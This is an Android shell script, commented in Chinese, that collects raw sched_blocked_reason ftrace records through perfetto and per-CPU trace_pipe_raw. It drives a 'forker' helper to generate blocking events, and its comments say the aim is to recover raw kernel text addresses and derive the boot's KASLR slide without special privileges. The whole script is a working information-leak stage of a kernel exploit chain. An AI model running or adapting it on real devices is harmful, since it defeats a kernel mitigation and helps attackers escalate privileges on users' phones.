#!/system/bin/sh
# grab_blocked.sh —— 抓 sched/sched_blocked_reason 的 raw 记录，用于推导本次启动的 KASLR slide
# payload 里含 caller = _RET_IP_（裸 64 位内核文本地址，不走 hash-ptr）
# shell 在 readtracefs 组，所以 trace_pipe_raw 可读；不需要任何特权。
T=/sys/kernel/tracing
O=/data/local/tmp

pkill -f "perfetto --txt" 2>/dev/null
sleep 1
rm -f $O/bl_*.bin $O/bl_text.txt $O/c_bl.txt

printf 'duration_ms: 20000\nbuffers { size_kb: 16384 }\ndata_sources { config { name: "linux.ftrace" ftrace_config { ftrace_events: "sched/sched_blocked_reason" buffer_size_kb: 16384 drain_period_ms: 900000 } } }\n' > $O/c_bl.txt
nohup sh -c "cat $O/c_bl.txt | perfetto --txt -c - -o /dev/null" >/dev/null 2>&1 &
sleep 2

# 顺手把文本里的 %pS 符号名留档，用于交叉校验。
# 只抓一次常有锚点太少的问题，所以跑 forker 时再补采几次（追加，不覆盖）。
grep "sched_blocked_reason" $T/trace > $O/bl_text.txt 2>/dev/null

for c in 0 1 2 3 4 5 6 7; do
    cat $T/per_cpu/cpu$c/trace_pipe_raw > $O/bl_$c.bin 2>/dev/null &
done

# 制造阻塞，提高事件量；每 60 轮补采一次符号文本
i=0
while [ $i -lt 300 ]; do
    $O/forker 2 30 >/dev/null 2>&1
    if [ $((i % 60)) -eq 0 ]; then
        grep "sched_blocked_reason" $T/trace >> $O/bl_text.txt 2>/dev/null
    fi
    i=$((i + 1))
done

sleep 1
pkill -f trace_pipe_raw
sleep 0.3

echo "--- sizes ---"
ls -l $O/bl_*.bin 2>/dev/null | awk '{print $5, $9}'
echo "text_lines=$(wc -l < $O/bl_text.txt 2>/dev/null)"
